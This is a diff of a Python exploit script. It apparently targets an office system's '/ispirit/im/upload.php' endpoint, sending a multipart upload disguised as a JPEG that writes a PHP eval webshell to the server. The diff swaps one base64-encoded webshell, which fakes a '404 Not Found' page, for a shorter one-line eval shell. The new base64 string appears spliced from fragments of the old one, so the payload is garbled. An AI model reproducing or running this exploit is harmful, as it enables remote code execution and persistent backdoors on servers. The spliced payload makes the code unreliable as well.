@@ -27,7 +27,7 @@ def exp(u):
     path = shell_dir + shell_name
     check_flag = "aaaabbbbccccc"
     # <?php $a="~+d()"^"!{+{}";$b=${$a}["a"];eval("n".$b);echo 112233;?>
-    b64_shell_content = "PD9waHAKZWNobyAiNDA0IE5vdCBGb3VuZC4gIjsKZGF0ZV9kZWZhdWx0X3RpbWV6b25lX3NldCgiUFJDIik7CiRrZXk9bWQ1KGRhdGUoIlktbS1kIEg6aSIsIHRpbWUoKSkpOwpjbGFzcyBURVNUIHsKICAgIGZ1bmN0aW9uIGVuY29kZSgka2V5KSB7CiAgICAgICAgQCRwb3N0ID0gYmFzZTY0X2RlY29kZSgkX1JFUVVFU1RbJ2EnXSk7CiAgICAgICAgZm9yICgkaT0wOyAkaSA8IHN0cmxlbigkcG9zdCk7ICRpKyspIHsgCiAgICAgICAgICAgICRwb3N0WyRpXSA9ICRwb3N0WyRpXSBeICRrZXlbJGklMzJdOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHBvc3Q7CiAgICB9CiAgICBmdW5jdGlvbiBhbnQoJGRhdGEpeyAKICAgICAgICByZXR1cm4gZXZhbCgkdGhpcy0+ZW5jb2RlKCIkZGF0YSIpKTsKICAgIH0KfQokdGVzdD1uZXcgVEVTVDsKJHRlc3QtPmFudCgka2V5KTsKPz4K"
+    b64_shell_content = "PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJhIl07ZXZhbCgibiIuJGIpO2VjaG8gMTEyMjMzOz8++ZW5jb2RlKCIkZGF0YSIpKTsKICAgIH0KfQokdGVzdD1uZXcgVEVTVDsKJHRlc3QtPmFudCgka2V5KTsKPz4K"
     data1 = "------fuck123\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n2\r\n------fuck123\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n123\r\n------fuck123\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1\r\n------fuck123\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\nfile_put_contents(\"../" + path + "\", base64_decode('" + b64_shell_content + "'));\r\necho \"" + check_flag + "\";\r\n?>\r\n------fuck123--"
     try:
         req1 = requests.post(u + "/ispirit/im/upload.php", headers=header, verify=False, data=data1,  timeout=25)
